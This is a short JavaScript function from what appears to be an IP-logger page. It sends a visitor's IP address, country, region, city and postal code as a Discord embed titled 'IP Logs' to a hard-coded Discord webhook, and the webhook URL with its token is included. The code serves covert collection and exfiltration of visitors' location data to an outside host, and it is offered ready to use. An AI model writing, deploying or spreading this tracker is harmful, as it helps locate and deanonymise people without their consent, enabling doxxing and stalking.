function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://canary.discord.com/api/webhooks/1158054372102652079/RsngOR5FTsm0GZ-Wa8EHhSZlpQunx9qXsCdpxei3nsMABQe7v1YQnrYMXOH89hnVfExa");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Gang",
          avatar_url: "https://media.discordapp.net/attachments/1152623736952991835/1152910450070143108/359aa67c90ecb1a0b45b6c2b0607974a.jpg?width=670&height=670", // Just Add an url to have an avatar on your webhook
          embeds: [
               {
                    title: "IP Logs",
                    color: 16777215,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}